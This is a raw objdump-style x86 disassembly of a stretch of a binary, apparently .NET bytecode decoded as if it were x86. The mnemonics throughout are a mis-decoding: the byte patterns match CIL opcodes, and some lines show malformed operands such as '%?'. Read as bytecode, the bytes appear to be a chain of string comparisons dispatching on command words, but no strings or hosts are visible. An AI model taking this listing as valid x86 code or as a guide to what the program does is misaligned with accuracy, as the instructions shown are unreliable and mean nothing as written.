  402b6e:	00 00                	add    %al,(%eax)
  402b70:	14 00                	adc    $0x0,%al
  402b72:	00 11                	add    %dl,(%ecx)
  402b74:	00 02                	add    %al,(%edx)
  402b76:	72 d5                	jb     0x402b4d
  402b78:	01 00                	add    %eax,(%eax)
  402b7a:	70 15                	jo     0x402b91
  402b7c:	16                   	push   %ss
  402b7d:	28 52 00             	sub    %dl,0x0(%edx)
  402b80:	00 0a                	add    %cl,(%edx)
  402b82:	0b 7e 1c             	or     0x1c(%esi),%edi
  402b85:	00 00                	add    %al,(%eax)
  402b87:	04 07                	add    $0x7,%al
  402b89:	8e b7 fe 04 16 fe    	mov    -0x1e9fb02(%edi),%?
  402b8f:	01 0c 08             	add    %ecx,(%eax,%ecx,1)
  402b92:	2c 06                	sub    $0x6,%al
  402b94:	16                   	push   %ss
  402b95:	80 1c 00 00          	sbbb   $0x0,(%eax,%eax,1)
  402b99:	04 00                	add    $0x0,%al
  402b9b:	07                   	pop    %es
  402b9c:	7e 1c                	jle    0x402bba
  402b9e:	00 00                	add    %al,(%eax)
  402ba0:	04 9a                	add    $0x9a,%al
  402ba2:	0a 2b                	or     (%ebx),%ch
  402ba4:	00 06                	add    %al,(%esi)
  402ba6:	2a 00                	sub    (%eax),%al
  402ba8:	13 30                	adc    (%eax),%esi
  402baa:	03 00                	add    (%eax),%eax
  402bac:	21 00                	and    %eax,(%eax)
  402bae:	00 00                	add    %al,(%eax)
  402bb0:	15 00 00 11 00       	adc    $0x110000,%eax
  402bb5:	7e 53                	jle    0x402c0a
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	0a 72 d9             	or     -0x27(%edx),%dh
  402bbc:	01 00                	add    %eax,(%eax)
  402bbe:	70 17                	jo     0x402bd7
  402bc0:	6f                   	outsl  %ds:(%esi),(%dx)
  402bc1:	4b                   	dec    %ebx
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	0a 0a                	or     (%edx),%cl
  402bc6:	06                   	push   %es
  402bc7:	72 2d                	jb     0x402bf6
  402bc9:	02 00                	add    (%eax),%al
  402bcb:	70 02                	jo     0x402bcf
  402bcd:	6f                   	outsl  %ds:(%esi),(%dx)
  402bce:	54                   	push   %esp
  402bcf:	00 00                	add    %al,(%eax)
  402bd1:	0a 00                	or     (%eax),%al
  402bd3:	00 2a                	add    %ch,(%edx)
  402bd5:	00 00                	add    %al,(%eax)
  402bd7:	00 1b                	add    %bl,(%ebx)
  402bd9:	30 09                	xor    %cl,(%ecx)
  402bdb:	00 30                	add    %dh,(%eax)
  402bdd:	19 00                	sbb    %eax,(%eax)
  402bdf:	00 16                	add    %dl,(%esi)
  402be1:	00 00                	add    %al,(%eax)
  402be3:	11 00                	adc    %eax,(%eax)
  402be5:	0f 00 28             	verw   (%eax)
  402be8:	18 00                	sbb    %al,(%eax)
  402bea:	00 06                	add    %al,(%esi)
  402bec:	7e 24                	jle    0x402c12
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	04 15                	add    $0x15,%al
  402bf2:	16                   	push   %ss
  402bf3:	28 52 00             	sub    %dl,0x0(%edx)
  402bf6:	00 0a                	add    %cl,(%edx)
  402bf8:	0a 00                	or     (%eax),%al
  402bfa:	06                   	push   %es
  402bfb:	16                   	push   %ss
  402bfc:	9a 13 07 00 11 07 13 	lcall  $0x1307,$0x11000713
  402c03:	3e 00 11             	add    %dl,%ds:(%ecx)
  402c06:	3e 72 43             	jb,pt  0x402c4c
  402c09:	02 00                	add    (%eax),%al
  402c0b:	70 16                	jo     0x402c23
  402c0d:	28 32                	sub    %dh,(%edx)
  402c0f:	00 00                	add    %al,(%eax)
  402c11:	0a 16                	or     (%esi),%dl
  402c13:	fe 01                	incb   (%ecx)
  402c15:	13 4f 11             	adc    0x11(%edi),%ecx
  402c18:	4f                   	dec    %edi
  402c19:	2c 0f                	sub    $0xf,%al
  402c1b:	00 06                	add    %al,(%esi)
  402c1d:	17                   	pop    %ss
  402c1e:	9a 28 55 00 00 0a 26 	lcall  $0x260a,$0x5528
  402c25:	38 91 0b 00 00 00    	cmp    %dl,0xb(%ecx)
  402c2b:	11 3e                	adc    %edi,(%esi)
  402c2d:	72 4d                	jb     0x402c7c
  402c2f:	02 00                	add    (%eax),%al
  402c31:	70 16                	jo     0x402c49
  402c33:	28 32                	sub    %dh,(%edx)
  402c35:	00 00                	add    %al,(%eax)
  402c37:	0a 16                	or     (%esi),%dl
  402c39:	fe 01                	incb   (%ecx)
  402c3b:	13 4f 11             	adc    0x11(%edi),%ecx
  402c3e:	4f                   	dec    %edi
  402c3f:	2c 11                	sub    $0x11,%al
  402c41:	00 72 4d             	add    %dh,0x4d(%edx)
  402c44:	02 00                	add    (%eax),%al
  402c46:	70 28                	jo     0x402c70
  402c48:	39 00                	cmp    %eax,(%eax)
  402c4a:	00 06                	add    %al,(%esi)
  402c4c:	26 38 69 0b          	cmp    %ch,%es:0xb(%ecx)
  402c50:	00 00                	add    %al,(%eax)
  402c52:	00 11                	add    %dl,(%ecx)
  402c54:	3e 72 57             	jb,pt  0x402cae
  402c57:	02 00                	add    (%eax),%al
  402c59:	70 16                	jo     0x402c71
  402c5b:	28 32                	sub    %dh,(%edx)
  402c5d:	00 00                	add    %al,(%eax)
  402c5f:	0a 16                	or     (%esi),%dl
  402c61:	fe 01                	incb   (%ecx)
  402c63:	13 4f 11             	adc    0x11(%edi),%ecx
  402c66:	4f                   	dec    %edi
  402c67:	2c 11                	sub    $0x11,%al
  402c69:	00 72 57             	add    %dh,0x57(%edx)
  402c6c:	02 00                	add    (%eax),%al
  402c6e:	70 28                	jo     0x402c98
  402c70:	39 00                	cmp    %eax,(%eax)
  402c72:	00 06                	add    %al,(%esi)
  402c74:	26 38 41 0b          	cmp    %al,%es:0xb(%ecx)
  402c78:	00 00                	add    %al,(%eax)
  402c7a:	00 11                	add    %dl,(%ecx)
  402c7c:	3e 72 5f             	jb,pt  0x402cde
  402c7f:	02 00                	add    (%eax),%al
  402c81:	70 16                	jo     0x402c99
  402c83:	28 32                	sub    %dh,(%edx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	0a 16                	or     (%esi),%dl
  402c89:	fe 01                	incb   (%ecx)
  402c8b:	13 4f 11             	adc    0x11(%edi),%ecx
  402c8e:	4f                   	dec    %edi
  402c8f:	2c 0f                	sub    $0xf,%al
  402c91:	00 06                	add    %al,(%esi)
  402c93:	17                   	pop    %ss
  402c94:	9a 28 2e 00 00 06 00 	lcall  $0x6,$0x2e28
  402c9b:	38 1b                	cmp    %bl,(%ebx)
  402c9d:	0b 00                	or     (%eax),%eax
  402c9f:	00 00                	add    %al,(%eax)
  402ca1:	11 3e                	adc    %edi,(%esi)
  402ca3:	72 6d                	jb     0x402d12
  402ca5:	02 00                	add    (%eax),%al
  402ca7:	70 16                	jo     0x402cbf
  402ca9:	28 32                	sub    %dh,(%edx)
  402cab:	00 00                	add    %al,(%eax)
  402cad:	0a 16                	or     (%esi),%dl
  402caf:	fe 01                	incb   (%ecx)
  402cb1:	13 4f 11             	adc    0x11(%edi),%ecx
  402cb4:	4f                   	dec    %edi
  402cb5:	2c 14                	sub    $0x14,%al
  402cb7:	00 72 8f             	add    %dh,-0x71(%edx)
  402cba:	02 00                	add    (%eax),%al
  402cbc:	70 16                	jo     0x402cd4
  402cbe:	16                   	push   %ss
  402cbf:	15 28 56 00 00       	adc    $0x5628,%eax
  402cc4:	0a 26                	or     (%esi),%ah
  402cc6:	38 f0                	cmp    %dh,%al
  402cc8:	0a 00                	or     (%eax),%al
  402cca:	00 00                	add    %al,(%eax)
  402ccc:	11 3e                	adc    %edi,(%esi)
  402cce:	72 b3                	jb     0x402c83
  402cd0:	02 00                	add    (%eax),%al
  402cd2:	70 16                	jo     0x402cea
  402cd4:	28 32                	sub    %dh,(%edx)
  402cd6:	00 00                	add    %al,(%eax)
  402cd8:	0a 16                	or     (%esi),%dl
  402cda:	fe 01                	incb   (%ecx)
  402cdc:	13 4f 11             	adc    0x11(%edi),%ecx
  402cdf:	4f                   	dec    %edi
  402ce0:	2c 14                	sub    $0x14,%al
  402ce2:	00 72 d3             	add    %dh,-0x2d(%edx)
  402ce5:	02 00                	add    (%eax),%al
  402ce7:	70 16                	jo     0x402cff
  402ce9:	16                   	push   %ss
  402cea:	15 28 56 00 00       	adc    $0x5628,%eax
  402cef:	0a 26                	or     (%esi),%ah
  402cf1:	38 c5                	cmp    %al,%ch
  402cf3:	0a 00                	or     (%eax),%al
  402cf5:	00 00                	add    %al,(%eax)
  402cf7:	11 3e                	adc    %edi,(%esi)
  402cf9:	72 f7                	jb     0x402cf2
  402cfb:	02 00                	add    (%eax),%al
  402cfd:	70 16                	jo     0x402d15
  402cff:	28 32                	sub    %dh,(%edx)
  402d01:	00 00                	add    %al,(%eax)
  402d03:	0a 16                	or     (%esi),%dl
  402d05:	fe 01                	incb   (%ecx)
  402d07:	13 4f 11             	adc    0x11(%edi),%ecx
  402d0a:	4f                   	dec    %edi
  402d0b:	2c 14                	sub    $0x14,%al
  402d0d:	00 72 05             	add    %dh,0x5(%edx)
  402d10:	03 00                	add    (%eax),%eax
  402d12:	70 16                	jo     0x402d2a
  402d14:	16                   	push   %ss
  402d15:	15 28 56 00 00       	adc    $0x5628,%eax
  402d1a:	0a 26                	or     (%esi),%ah
  402d1c:	38 9a 0a 00 00 00    	cmp    %bl,0xa(%edx)
  402d22:	11 3e                	adc    %edi,(%esi)
  402d24:	72 29                	jb     0x402d4f
  402d26:	03 00                	add    (%eax),%eax
  402d28:	70 16                	jo     0x402d40
  402d2a:	28 32                	sub    %dh,(%edx)
  402d2c:	00 00                	add    %al,(%eax)
  402d2e:	0a 16                	or     (%esi),%dl
  402d30:	fe 01                	incb   (%ecx)
  402d32:	13 4f 11             	adc    0x11(%edi),%ecx
  402d35:	4f                   	dec    %edi
  402d36:	39 49 01             	cmp    %ecx,0x1(%ecx)
  402d39:	00 00                	add    %al,(%eax)
  402d3b:	00 00                	add    %al,(%eax)
  402d3d:	06                   	push   %es
  402d3e:	17                   	pop    %ss
  402d3f:	9a 13 3f 00 11 3f 72 	lcall  $0x723f,$0x11003f13
  402d46:	3b 03                	cmp    (%ebx),%eax
  402d48:	00 70 16             	add    %dh,0x16(%eax)
  402d4b:	28 32                	sub    %dh,(%edx)
  402d4d:	00 00                	add    %al,(%eax)
  402d4f:	0a 16                	or     (%esi),%dl
  402d51:	fe 01                	incb   (%ecx)
  402d53:	13 50 11             	adc    0x11(%eax),%edx
  402d56:	50                   	push   %eax
  402d57:	2c 07                	sub    $0x7,%al
  402d59:	00 1f                	add    %bl,(%edi)
  402d5b:	40                   	inc    %eax
  402d5c:	13 09                	adc    (%ecx),%ecx
  402d5e:	2b 58 00             	sub    0x0(%eax),%ebx
  402d61:	11 3f                	adc    %edi,(%edi)
  402d63:	72 3f                	jb     0x402da4
  402d65:	03 00                	add    (%eax),%eax
  402d67:	70 16                	jo     0x402d7f
  402d69:	28 32                	sub    %dh,(%edx)
  402d6b:	00 00                	add    %al,(%eax)
  402d6d:	0a 16                	or     (%esi),%dl
  402d6f:	fe 01                	incb   (%ecx)
  402d71:	13 50 11             	adc    0x11(%eax),%edx
  402d74:	50                   	push   %eax
  402d75:	2c 07                	sub    $0x7,%al
  402d77:	00 1f                	add    %bl,(%edi)
  402d79:	20 13                	and    %dl,(%ebx)
  402d7b:	09 2b                	or     %ebp,(%ebx)
  402d7d:	3a 00                	cmp    (%eax),%al
  402d7f:	11 3f                	adc    %edi,(%edi)
  402d81:	72 43                	jb     0x402dc6
  402d83:	03 00                	add    (%eax),%eax
  402d85:	70 16                	jo     0x402d9d
  402d87:	28 32                	sub    %dh,(%edx)
  402d89:	00 00                	add    %al,(%eax)
  402d8b:	0a 16                	or     (%esi),%dl
  402d8d:	fe 01                	incb   (%ecx)
  402d8f:	13 50 11             	adc    0x11(%eax),%edx
  402d92:	50                   	push   %eax
  402d93:	2c 07                	sub    $0x7,%al
  402d95:	00 1f                	add    %bl,(%edi)
  402d97:	30 13                	xor    %dl,(%ebx)
  402d99:	09 2b                	or     %ebp,(%ebx)
  402d9b:	1c 00                	sbb    $0x0,%al
  402d9d:	11 3f                	adc    %edi,(%edi)
  402d9f:	72 47                	jb     0x402de8
  402da1:	03 00                	add    (%eax),%eax
  402da3:	70 16                	jo     0x402dbb
  402da5:	28 32                	sub    %dh,(%edx)
  402da7:	00 00                	add    %al,(%eax)
  402da9:	0a 16                	or     (%esi),%dl
  402dab:	fe 01                	incb   (%ecx)
  402dad:	13 50 11             	adc    0x11(%eax),%edx
  402db0:	50                   	push   %eax
  402db1:	2c 05                	sub    $0x5,%al
  402db3:	00 1f                	add    %bl,(%edi)
  402db5:	10 13                	adc    %dl,(%ebx)
  402db7:	09 00                	or     %eax,(%eax)
  402db9:	00 06                	add    %al,(%esi)
  402dbb:	18 9a 13 40 00 11    	sbb    %bl,0x11004013(%edx)
  402dc1:	40                   	inc    %eax
  402dc2:	72 3b                	jb     0x402dff
  402dc4:	03 00                	add    (%eax),%eax
  402dc6:	70 16                	jo     0x402dde
  402dc8:	28 32                	sub    %dh,(%edx)
  402dca:	00 00                	add    %al,(%eax)
  402dcc:	0a 16                	or     (%esi),%dl
  402dce:	fe 01                	incb   (%ecx)
  402dd0:	13 50 11             	adc    0x11(%eax),%edx
  402dd3:	50                   	push   %eax
  402dd4:	2c 09                	sub    $0x9,%al
  402dd6:	00 1a                	add    %bl,(%edx)
  402dd8:	13 08                	adc    (%eax),%ecx
  402dda:	38 8f 00 00 00 00    	cmp    %cl,0x0(%edi)
  402de0:	11 40 72             	adc    %eax,0x72(%eax)
  402de3:	3f                   	aas
  402de4:	03 00                	add    (%eax),%eax
  402de6:	70 16                	jo     0x402dfe
  402de8:	28 32                	sub    %dh,(%edx)
  402dea:	00 00                	add    %al,(%eax)
  402dec:	0a 16                	or     (%esi),%dl
  402dee:	fe 01                	incb   (%ecx)
  402df0:	13 50 11             	adc    0x11(%eax),%edx
  402df3:	50                   	push   %eax
  402df4:	2c 06                	sub    $0x6,%al
  402df6:	00 19                	add    %bl,(%ecx)
  402df8:	13 08                	adc    (%eax),%ecx
  402dfa:	2b 72 00             	sub    0x0(%edx),%esi
  402dfd:	11 40 72             	adc    %eax,0x72(%eax)
  402e00:	43                   	inc    %ebx
  402e01:	03 00                	add    (%eax),%eax
  402e03:	70 16                	jo     0x402e1b
  402e05:	28 32                	sub    %dh,(%edx)
  402e07:	00 00                	add    %al,(%eax)
  402e09:	0a 16                	or     (%esi),%dl
  402e0b:	fe 01                	incb   (%ecx)
  402e0d:	13 50 11             	adc    0x11(%eax),%edx
  402e10:	50                   	push   %eax
  402e11:	2c 06                	sub    $0x6,%al
  402e13:	00 16                	add    %dl,(%esi)
  402e15:	13 08                	adc    (%eax),%ecx
  402e17:	2b 55 00             	sub    0x0(%ebp),%edx
  402e1a:	11 40 72             	adc    %eax,0x72(%eax)
  402e1d:	47                   	inc    %edi
  402e1e:	03 00                	add    (%eax),%eax
  402e20:	70 16                	jo     0x402e38
  402e22:	28 32                	sub    %dh,(%edx)
  402e24:	00 00                	add    %al,(%eax)
  402e26:	0a 16                	or     (%esi),%dl
  402e28:	fe 01                	incb   (%ecx)
  402e2a:	13 50 11             	adc    0x11(%eax),%edx
  402e2d:	50                   	push   %eax
  402e2e:	2c 06                	sub    $0x6,%al
  402e30:	00 17                	add    %dl,(%edi)
  402e32:	13 08                	adc    (%eax),%ecx
  402e34:	2b 38                	sub    (%eax),%edi
  402e36:	00 11                	add    %dl,(%ecx)
  402e38:	40                   	inc    %eax
  402e39:	72 4b                	jb     0x402e86
  402e3b:	03 00                	add    (%eax),%eax
  402e3d:	70 16                	jo     0x402e55
  402e3f:	28 32                	sub    %dh,(%edx)
  402e41:	00 00                	add    %al,(%eax)
  402e43:	0a 16                	or     (%esi),%dl
  402e45:	fe 01                	incb   (%ecx)
  402e47:	13 50 11             	adc    0x11(%eax),%edx
  402e4a:	50                   	push   %eax
  402e4b:	2c 06                	sub    $0x6,%al
  402e4d:	00 1b                	add    %bl,(%ebx)
  402e4f:	13 08                	adc    (%eax),%ecx
  402e51:	2b 1b                	sub    (%ebx),%ebx
  402e53:	00 11                	add    %dl,(%ecx)
  402e55:	40                   	inc    %eax
  402e56:	72 4f                	jb     0x402ea7
  402e58:	03 00                	add    (%eax),%eax
  402e5a:	70 16                	jo     0x402e72
  402e5c:	28 32                	sub    %dh,(%edx)
  402e5e:	00 00                	add    %al,(%eax)
  402e60:	0a 16                	or     (%esi),%dl
  402e62:	fe 01                	incb   (%ecx)
  402e64:	13 50 11             	adc    0x11(%eax),%edx
  402e67:	50                   	push   %eax
  402e68:	2c 04                	sub    $0x4,%al
  402e6a:	00 18                	add    %bl,(%eax)
  402e6c:	13 08                	adc    (%eax),%ecx
  402e6e:	00 06                	add    %al,(%esi)
  402e70:	1a 9a 06 19 9a 11    	sbb    0x119a1906(%edx),%bl
  402e76:	08 11                	or     %dl,(%ecx)
  402e78:	09 28                	or     %ebp,(%eax)
  402e7a:	57                   	push   %edi
  402e7b:	00 00                	add    %al,(%eax)
  402e7d:	0a 26                	or     (%esi),%ah
  402e7f:	38 37                	cmp    %dh,(%edi)
  402e81:	09 00                	or     %eax,(%eax)
  402e83:	00 00                	add    %al,(%eax)
  402e85:	11 3e                	adc    %edi,(%esi)
  402e87:	72 53                	jb     0x402edc
  402e89:	03 00                	add    (%eax),%eax
  402e8b:	70 16                	jo     0x402ea3
  402e8d:	28 32                	sub    %dh,(%edx)
  402e8f:	00 00                	add    %al,(%eax)
  402e91:	0a 16                	or     (%esi),%dl
  402e93:	fe 01                	incb   (%ecx)
  402e95:	13 50 11             	adc    0x11(%eax),%edx
  402e98:	50                   	push   %eax
  402e99:	39 83 00 00 00 00    	cmp    %eax,0x0(%ebx)
  402e9f:	72 5f                	jb     0x402f00
  402ea1:	03 00                	add    (%eax),%eax
  402ea3:	70 72                	jo     0x402f17
  402ea5:	69 00 00 70 28 58    	imul   $0x58287000,(%eax),%eax
  402eab:	00 00                	add    %al,(%eax)
  402ead:	0a 28                	or     (%eax),%ch
  402eaf:	0c 00                	or     $0x0,%al
  402eb1:	00 0a                	add    %cl,(%edx)
  402eb3:	13 0a                	adc    (%edx),%ecx
  402eb5:	11 0a                	adc    %ecx,(%edx)
  402eb7:	14 72                	adc    $0x72,%al
  402eb9:	79 03                	jns    0x402ebe
  402ebb:	00 70 17             	add    %dh,0x17(%eax)
  402ebe:	8d 0a                	lea    (%edx),%ecx
  402ec0:	00 00                	add    %al,(%eax)
  402ec2:	01 13                	add    %edx,(%ebx)
  402ec4:	43                   	inc    %ebx
  402ec5:	11 43 16             	adc    %eax,0x16(%ebx)
  402ec8:	06                   	push   %es
  402ec9:	13 41 11             	adc    0x11(%ecx),%eax
  402ecc:	41                   	inc    %ecx
  402ecd:	17                   	pop    %ss
  402ece:	13 42 11             	adc    0x11(%edx),%eax
  402ed1:	42                   	inc    %edx
  402ed2:	9a a2 00 11 43 13 44 	lcall  $0x4413,$0x431100a2
  402ed9:	11 44 14 14          	adc    %eax,0x14(%esp,%edx,1)
  402edd:	17                   	pop    %ss
  402ede:	8d 42 00             	lea    0x0(%edx),%eax
  402ee1:	00 01                	add    %al,(%ecx)
  402ee3:	13 45 11             	adc    0x11(%ebp),%eax
  402ee6:	45                   	inc    %ebp
  402ee7:	16                   	push   %ss
  402ee8:	17                   	pop    %ss
  402ee9:	9c                   	pushf
  402eea:	11 45 17             	adc    %eax,0x17(%ebp)
  402eed:	28 41 00             	sub    %al,0x0(%ecx)
  402ef0:	00 0a                	add    %cl,(%edx)
  402ef2:	26 11 45 16          	adc    %eax,%es:0x16(%ebp)
  402ef6:	90                   	nop
  402ef7:	2c 23                	sub    $0x23,%al
  402ef9:	11 41 11             	adc    %eax,0x11(%ecx)
  402efc:	42                   	inc    %edx
  402efd:	11 44 16 9a          	adc    %eax,-0x66(%esi,%edx,1)
  402f01:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402f04:	00 0a                	add    %cl,(%edx)
  402f06:	d0 23                	shlb   $1,(%ebx)
  402f08:	00 00                	add    %al,(%eax)
  402f0a:	01 28                	add    %ebp,(%eax)
  402f0c:	0f 00 00             	sldt   (%eax)
  402f0f:	0a 28                	or     (%eax),%ch
  402f11:	59                   	pop    %ecx
  402f12:	00 00                	add    %al,(%eax)
  402f14:	0a 74 23 00          	or     0x0(%ebx,%eiz,1),%dh
  402f18:	00 01                	add    %al,(%ecx)
  402f1a:	a2 00 38 9a 08       	mov    %al,0x89a3800
  402f1f:	00 00                	add    %al,(%eax)
  402f21:	00 11                	add    %dl,(%ecx)
  402f23:	3e 72 85             	jb,pt  0x402eab
  402f26:	03 00                	add    (%eax),%eax
  402f28:	70 16                	jo     0x402f40
  402f2a:	28 32                	sub    %dh,(%edx)
  402f2c:	00 00                	add    %al,(%eax)
  402f2e:	0a 16                	or     (%esi),%dl
  402f30:	fe 01                	incb   (%ecx)
  402f32:	13 50 11             	adc    0x11(%eax),%edx
  402f35:	50                   	push   %eax
  402f36:	2c 28                	sub    $0x28,%al
  402f38:	00 06                	add    %al,(%esi)
  402f3a:	17                   	pop    %ss
  402f3b:	9a 28 5a 00 00 0a 28 	lcall  $0x280a,$0x5a28
  402f42:	5b                   	pop    %ebx
  402f43:	00 00                	add    %al,(%eax)
  402f45:	0a b7 06 18 9a 28    	or     0x289a1806(%edi),%dh
  402f4b:	5a                   	pop    %edx
  402f4c:	00 00                	add    %al,(%eax)
  402f4e:	0a 28                	or     (%eax),%ch
  402f50:	5b                   	pop    %ebx
  402f51:	00 00                	add    %al,(%eax)
  402f53:	0a b7 28 2d 00 00    	or     0x2d28(%edi),%dh
  402f59:	06                   	push   %es
  402f5a:	00 38                	add    %bh,(%eax)
  402f5c:	5b                   	pop    %ebx
  402f5d:	08 00                	or     %al,(%eax)
  402f5f:	00 00                	add    %al,(%eax)
  402f61:	11 3e                	adc    %edi,(%esi)
  402f63:	72 8f                	jb     0x402ef4
  402f65:	03 00                	add    (%eax),%eax
  402f67:	70 16                	jo     0x402f7f
  402f69:	28 32                	sub    %dh,(%edx)
  402f6b:	00 00                	add    %al,(%eax)
  402f6d:	0a 16                	or     (%esi),%dl
  402f6f:	fe 01                	incb   (%ecx)
  402f71:	13 50 11             	adc    0x11(%eax),%edx
  402f74:	50                   	push   %eax
  402f75:	2c 1f                	sub    $0x1f,%al
  402f77:	00 06                	add    %al,(%esi)
  402f79:	17                   	pop    %ss
  402f7a:	9a 28 5a 00 00 0a 28 	lcall  $0x280a,$0x5a28
  402f81:	5b                   	pop    %ebx
  402f82:	00 00                	add    %al,(%eax)
  402f84:	0a b7 20 2c 01 00    	or     0x12c20(%edi),%dh
  402f8a:	00 28                	add    %ch,(%eax)
  402f8c:	2d 00 00 06 00       	sub    $0x60000,%eax
  402f91:	38 25 08 00 00 00    	cmp    %ah,0x8
  402f97:	11 3e                	adc    %edi,(%esi)
  402f99:	72 9b                	jb     0x402f36
  402f9b:	03 00                	add    (%eax),%eax
  402f9d:	70 16                	jo     0x402fb5
  402f9f:	28 32                	sub    %dh,(%edx)
  402fa1:	00 00                	add    %al,(%eax)
  402fa3:	0a 16                	or     (%esi),%dl
  402fa5:	fe 01                	incb   (%ecx)
  402fa7:	13 50 11             	adc    0x11(%eax),%edx
  402faa:	50                   	push   %eax
  402fab:	2c 22                	sub    $0x22,%al
  402fad:	00 72 a9             	add    %dh,-0x57(%edx)
  402fb0:	03 00                	add    (%eax),%eax
  402fb2:	70 13                	jo     0x402fc7
  402fb4:	46                   	inc    %esi
  402fb5:	12 46 72             	adc    0x72(%esi),%al
  402fb8:	69 00 00 70 13 47    	imul   $0x47137000,(%eax),%eax
  402fbe:	12 47 16             	adc    0x16(%edi),%al
  402fc1:	6a 16                	push   $0x16
  402fc3:	6a 28                	push   $0x28
  402fc5:	2c 00                	sub    $0x0,%al
  402fc7:	00 06                	add    %al,(%esi)
  402fc9:	26 38 ec             	es cmp %ch,%ah
  402fcc:	07                   	pop    %es
  402fcd:	00 00                	add    %al,(%eax)
  402fcf:	00 11                	add    %dl,(%ecx)
  402fd1:	3e 72 d5             	jb,pt  0x402fa9
  402fd4:	03 00                	add    (%eax),%eax
  402fd6:	70 16                	jo     0x402fee
  402fd8:	28 32                	sub    %dh,(%edx)
  402fda:	00 00                	add    %al,(%eax)
  402fdc:	0a 16                	or     (%esi),%dl
  402fde:	fe 01                	incb   (%ecx)
  402fe0:	13 50 11             	adc    0x11(%eax),%edx
  402fe3:	50                   	push   %eax
  402fe4:	2c 22                	sub    $0x22,%al
  402fe6:	00 72 e5             	add    %dh,-0x1b(%edx)
  402fe9:	03 00                	add    (%eax),%eax
  402feb:	70 13                	jo     0x403000
  402fed:	47                   	inc    %edi
  402fee:	12 47 72             	adc    0x72(%edi),%al
  402ff1:	69 00 00 70 13 46    	imul   $0x46137000,(%eax),%eax
  402ff7:	12 46 16             	adc    0x16(%esi),%al
  402ffa:	6a 16                	push   $0x16
  402ffc:	6a 28                	push   $0x28
  402ffe:	2c 00                	sub    $0x0,%al
  403000:	00 06                	add    %al,(%esi)
  403002:	26 38 b3 07 00 00 00 	cmp    %dh,%es:0x7(%ebx)
  403009:	11 3e                	adc    %edi,(%esi)
  40300b:	72 15                	jb     0x403022
  40300d:	04 00                	add    $0x0,%al
  40300f:	70 16                	jo     0x403027
  403011:	28 32                	sub    %dh,(%edx)
  403013:	00 00                	add    %al,(%eax)
  403015:	0a 16                	or     (%esi),%dl
  403017:	fe 01                	incb   (%ecx)
  403019:	13 50 11             	adc    0x11(%eax),%edx
  40301c:	50                   	push   %eax
  40301d:	2c 0d                	sub    $0xd,%al
  40301f:	00 17                	add    %dl,(%edi)
  403021:	28 28                	sub    %ch,(%eax)
  403023:	00 00                	add    %al,(%eax)
  403025:	06                   	push   %es
  403026:	26 38 8f 07 00 00 00 	cmp    %cl,%es:0x7(%edi)
  40302d:	11 3e                	adc    %edi,(%esi)
  40302f:	72 29                	jb     0x40305a
  403031:	04 00                	add    $0x0,%al
  403033:	70 16                	jo     0x40304b
  403035:	28 32                	sub    %dh,(%edx)
  403037:	00 00                	add    %al,(%eax)
  403039:	0a 16                	or     (%esi),%dl
  40303b:	fe 01                	incb   (%ecx)
  40303d:	13 50 11             	adc    0x11(%eax),%edx
  403040:	50                   	push   %eax
  403041:	2c 0d                	sub    $0xd,%al
  403043:	00 16                	add    %dl,(%esi)
  403045:	28 28                	sub    %ch,(%eax)
  403047:	00 00                	add    %al,(%eax)
  403049:	06                   	push   %es
  40304a:	26 38 6b 07          	cmp    %ch,%es:0x7(%ebx)
  40304e:	00 00                	add    %al,(%eax)
  403050:	00 11                	add    %dl,(%ecx)
  403052:	3e 72 3b             	jb,pt  0x403090
  403055:	04 00                	add    $0x0,%al
  403057:	70 16                	jo     0x40306f
  403059:	28 32                	sub    %dh,(%edx)
  40305b:	00 00                	add    %al,(%eax)
  40305d:	0a 16                	or     (%esi),%dl
  40305f:	fe 01                	incb   (%ecx)
  403061:	13 50 11             	adc    0x11(%eax),%edx
  403064:	50                   	push   %eax
  403065:	2c 18                	sub    $0x18,%al
  403067:	00 15 20 12 01 00    	add    %dl,0x11220
  40306d:	00 20                	add    %ah,(%eax)
  40306f:	70 f1                	jo     0x403062
  403071:	00 00                	add    %al,(%eax)
  403073:	18 28                	sbb    %ch,(%eax)
  403075:	2a 00                	sub    (%eax),%al
  403077:	00 06                	add    %al,(%esi)
  403079:	00 38                	add    %bh,(%eax)
  40307b:	3c 07                	cmp    $0x7,%al
  40307d:	00 00                	add    %al,(%eax)
  40307f:	00 11                	add    %dl,(%ecx)
  403081:	3e 72 59             	jb,pt  0x4030dd
  403084:	04 00                	add    $0x0,%al
  403086:	70 16                	jo     0x40309e
  403088:	28 32                	sub    %dh,(%edx)
  40308a:	00 00                	add    %al,(%eax)
  40308c:	0a 16                	or     (%esi),%dl
  40308e:	fe 01                	incb   (%ecx)
  403090:	13 50 11             	adc    0x11(%eax),%edx
  403093:	50                   	push   %eax
  403094:	2c 18                	sub    $0x18,%al
  403096:	00 15 20 12 01 00    	add    %dl,0x11220
  40309c:	00 20                	add    %ah,(%eax)
  40309e:	70 f1                	jo     0x403091
  4030a0:	00 00                	add    %al,(%eax)
  4030a2:	15 28 2a 00 00       	adc    $0x2a28,%eax
  4030a7:	06                   	push   %es
  4030a8:	00 38                	add    %bh,(%eax)
  4030aa:	0d 07 00 00 00       	or     $0x7,%eax
  4030af:	11 3e                	adc    %edi,(%esi)
  4030b1:	72 75                	jb     0x403128
  4030b3:	04 00                	add    $0x0,%al
  4030b5:	70 16                	jo     0x4030cd
  4030b7:	28 32                	sub    %dh,(%edx)
  4030b9:	00 00                	add    %al,(%eax)
  4030bb:	0a 16                	or     (%esi),%dl
  4030bd:	fe 01                	incb   (%ecx)
  4030bf:	13 50 11             	adc    0x11(%eax),%edx
  4030c2:	50                   	push   %eax
  4030c3:	2c 0e                	sub    $0xe,%al
  4030c5:	00 16                	add    %dl,(%esi)
  4030c7:	6a 28                	push   $0x28
  4030c9:	29 00                	sub    %eax,(%eax)
  4030cb:	00 06                	add    %al,(%esi)
  4030cd:	26 38 e8             	es cmp %ch,%al
  4030d0:	06                   	push   %es
  4030d1:	00 00                	add    %al,(%eax)
  4030d3:	00 11                	add    %dl,(%ecx)
  4030d5:	3e 72 8d             	jb,pt  0x403065
  4030d8:	04 00                	add    $0x0,%al
  4030da:	70 16                	jo     0x4030f2
  4030dc:	28 32                	sub    %dh,(%edx)
  4030de:	00 00                	add    %al,(%eax)
  4030e0:	0a 16                	or     (%esi),%dl
  4030e2:	fe 01                	incb   (%ecx)
